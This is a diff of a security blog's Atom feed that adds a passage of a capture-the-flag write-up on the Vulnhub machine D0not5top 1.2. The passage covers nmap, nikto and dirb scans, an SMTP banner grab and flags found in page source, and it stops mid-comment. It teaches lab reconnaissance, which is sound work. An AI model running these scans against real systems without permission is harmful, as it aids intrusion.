@@ -1,4 +1,808 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-06-07T14:04:58+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Nebula 01</title><link href="http://localhost:4000/nebula-1/" rel="alternate" type="text/html" title="Nebula 01" /><published>2017-06-07T00:00:00+00:00</published><updated>2017-06-07T00:00:00+00:00</updated><id>http://localhost:4000/nebula-1</id><content type="html" xml:base="http://localhost:4000/nebula-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-06-10T18:31:25+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - D0not5top 1.2</title><link href="http://localhost:4000/vulnhub-d0not5top/" rel="alternate" type="text/html" title="Vulnhub.com - D0not5top 1.2" /><published>2017-06-10T02:00:00+00:00</published><updated>2017-06-10T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-d0not5top</id><content type="html" xml:base="http://localhost:4000/vulnhub-d0not5top/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Today we're going to play with another machine from &lt;a href=&quot;&quot;&gt;Vulnhub&lt;/a&gt; called &lt;a href=&quot;https://www.vulnhub.com/entry/d0not5top-12,191/&quot;&gt;D0not5top&lt;/a&gt;. Our aim is to find all 7 flags, and root the box. It seems to be a little harder then the previous ones, but all we want is a good challenge, right? &lt;/p&gt;
+
+&lt;h1&gt;Write-Up&lt;/h1&gt;
+
+&lt;p&gt;As we know that IP addess of this machine is &lt;b&gt;10.0.2.8&lt;/b&gt;, we can start by enumerating the machine for any open ports. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap -v -p- -sS -A -T4 10.0.2.8
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-06-08 13:32 EDT
+NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 13:32
+Completed NSE at 13:32, 0.00s elapsed
+Initiating NSE at 13:32
+Completed NSE at 13:32, 0.00s elapsed
+Initiating ARP Ping Scan at 13:32
+Scanning 10.0.2.8 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 13:32, 0.03s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Parallel DNS resolution of 1 host. at 13:32
+Completed Parallel DNS resolution of 1 host. at 13:32, 6.52s elapsed
+Initiating SYN Stealth Scan at 13:32
+Scanning 10.0.2.8 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 53/tcp on 10.0.2.8
+Discovered open port 80/tcp on 10.0.2.8
+Discovered open port 22/tcp on 10.0.2.8
+Discovered open port 111/tcp on 10.0.2.8
+Discovered open port 25/tcp on 10.0.2.8
+Discovered open port 59418/tcp on 10.0.2.8
+Completed SYN Stealth Scan at 13:32, 3.47s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Service scan at 13:32
+Scanning 6 services on 10.0.2.8
+Completed Service scan at 13:32, 13.56s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.8&lt;/span&gt;
+NSE: Script scanning 10.0.2.8.
+Initiating NSE at 13:32
+Completed NSE at 13:32, 8.77s elapsed
+Initiating NSE at 13:32
+Completed NSE at 13:32, 0.01s elapsed
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.8
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00070s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 65529 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   1024 a7:52:df:39:80:7c:66:16:2f:fd:f7:7b:80:13:09:85 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   2048 bf:d9:5a:22:54:91:cc:36:40:3c:e6:35:4f:8e:0c:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 16:e6:84:e1:5f:80:bc:27:6a:50:01:55:f0:c0:cc:72 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+25/tcp    open  smtp    Exim smtpd
+| smtp-commands: D0Not5top Hello nmap.scanme.org &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.2.15], SIZE 52428800, 8BITMIME, PIPELINING, HELP,
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
+53/tcp    open  domain  PowerDNS 3.4.1
+| dns-nsid:
+|   NSID: D0Not5top &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;44304e6f7435746f70&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   id.server: D0Not5top
+|_  bind.version: PowerDNS Authoritative Server 3.4.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jenkins@autotest.powerdns.com built 20170111224403 root@x86-csail-01.debian.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp    open  http    Apache httpd
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 22 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| /games /dropbox /contact /blog/wp-login.php
+| /blog/wp-admin /search /support/search.php
+| /extend/plugins/search.php /plugins/search.php /extend/themes/search.php
+|_/themes/search.php /support/rss /archive/ /wp-admin/ /wp-content/
+|_http-server-header: Apache
+|_http-title: Site doesnt have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+111/tcp   open  rpcbind 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          36778/udp  status
+|_  100024  1          59418/tcp  status
+59418/tcp open  status  1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100024)&lt;/span&gt;
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          36778/udp  status
+|_  100024  1          59418/tcp  status
+MAC Address: 08:00:27:58:A4:C4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.0
+Uptime guess: 198.048 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Tue Nov 22 11:23:13 2016&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Network Distance: 1 hop
+TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;261 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.70 ms 10.0.2.8
+
+NSE: Script Post-scanning.
+Initiating NSE at 13:32
+Completed NSE at 13:32, 0.00s elapsed
+Initiating NSE at 13:32
+Completed NSE at 13:32, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;34.93 seconds
+            Raw packets sent: 65558 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.885MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65550 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we have found a lot of information about the machine. I'll leave the &lt;b&gt;ssh&lt;/b&gt;, as we don't have much information to start from, but &lt;b&gt;smtp&lt;/b&gt; seems to be a good choice. &lt;/p&gt;
+
+&lt;h1&gt;SMTP&lt;/h1&gt;
+
+&lt;p&gt;Let's try and connect to it, maybe we'll be lucky to find some clues. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nc 10.0.2.8 25
+220 46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874 327231646434 717070756 5793437 347 3767879610a EXIM SMTP&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;A string in hexadecimal format? We can try to decode it using xxd tool. Option &lt;b&gt;-ps&lt;/b&gt; will make our output in plain hexdump style. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874 327231646434 717070756 5793437 347 3767879610a&quot;&lt;/span&gt; | xxd -r -ps
+FL46_3:29dryf67uheht2r1dd4qppuey474svxya&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Third flag already! But where are the first two?  &lt;/p&gt;
+
+&lt;h1&gt;HTTP&lt;/h1&gt;
+
+&lt;p&gt;In order to move on with this attack I decided to take a look at the website, hosted at port 80. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/website-1.png&quot; alt=&quot;First Look&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But there was nothing here, both in the source code and in the page itself. In order to try and find anything more, I decided to deploy an &lt;b&gt;Nikto&lt;/b&gt; scan. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 10.0.2.8
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.8
++ Target Hostname:    10.0.2.8
++ Target Port:        80
++ Start Time:         2017-06-08 13:36:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ Server: Apache
++ Server leaks inodes via ETags, header found with file /, fields: 0xd3 0x54c550ee22d56
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-3268: /games/: Directory indexing found.
++ Entry &lt;span class=&quot;s1&quot;&gt;'/games/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/dropbox/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/contact/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/search/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/archive/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/wp-admin/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/wp-content/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/wp-includes/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/comment-page-/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/trackback/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/xmlrpc.php'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/blackhole/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/mint/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/feed/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt; contains 26 entries which should be manually viewed.
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
++ OSVDB-3092: /archive/: This might be interesting...
++ OSVDB-3092: /support/: This might be interesting...
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wp-admin/: Admin login page/section found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 7563 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 28 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2017-06-08 13:37:05 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;18 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Wordpress website? Unfortunately not, it was false alarm, as they were only blank pages. Let's hope that &lt;b&gt;robots.txt&lt;/b&gt; will tell us something more about this site.   &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;User-agent: *
+Disallow: /games
+Disallow: /dropbox
+Disallow: /contact
+Disallow: /blog/wp-login.php
+Disallow: /blog/wp-admin
+Disallow: /search
+Disallow: /support/search.php
+Disallow: /extend/plugins/search.php
+Disallow: /plugins/search.php
+Disallow: /extend/themes/search.php
+Disallow: /themes/search.php
+Disallow: /support/rss
+Disallow: /archive/
+Disallow: /wp-admin/
+Disallow: /wp-content/
+Disallow: /wp-includes/
+Disallow: /comment-page-
+Disallow: /trackback/
+Disallow: /xmlrpc.php
+Disallow: /blackhole/
+Disallow: /mint/
+Disallow: /feed/
+Allow: /tag/mint/
+Allow: /tag/feed/
+Allow: /wp-content/images/
+Allow: /wp-content/online/
+
+# terminal knows where to go.
+User-agent: GameTerminal
+Disallow:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Bad luck, after manually checking each entry all of them were, once again, blank pages. Even &lt;b&gt;phpmyadmin&lt;/b&gt; website, that I came around, didn't help me.  &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/phpmyadmin.png&quot; alt=&quot;phpmyadmin&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Desperatly looking for something more I decided to run a &lt;b&gt;dirb&lt;/b&gt; scan, in hope to find something.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;dirb http://10.0.2.8
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Jun  8 13:43:39 2017
+URL_BASE: http://10.0.2.8/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.0.2.8/ ----
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/archive/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/blog/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/contact/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/control/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/feed/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/games/
++ http://10.0.2.8/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:211&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/manual/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/mint/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/phpmyadmin/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/plugins/
++ http://10.0.2.8/robots.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:695&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/search/
++ http://10.0.2.8/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/support/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/tag/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/themes/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/trackback/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/wp-admin/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/wp-content/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/wp-includes/
+&lt;span class=&quot;gp&quot;&gt;==&amp;gt; &lt;/span&gt;DIRECTORY: http://10.0.2.8/xmlrpc.php/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;Control&lt;/h1&gt;
+
+&lt;p&gt;That's only a part of the entry, but I've found that there are more results such as &lt;b&gt;control&lt;/b&gt; or &lt;b&gt;server-status&lt;/b&gt; page. Let's look at them, firstly the control page. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/control.png&quot; alt=&quot;control&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;None of the functions seemed to work so I decided to look at the source code. And here it is, the first flag! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrapper&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- FL46_1:urh8fu3i039rfoy254sx2xtrs5wc6767w --&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;nav&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navbar navbar-inverse navbar-fixed-top&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navigation&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navbar-header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navbar-brand&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Startmin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now, I think we're on the right track. Another clue was hidden, scrooling downwards.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-lg-12&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;page-header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;DNS Control Panel&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fluid-ratio-resize&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- M3gusta said he hasn't had time to get this w0rKING.
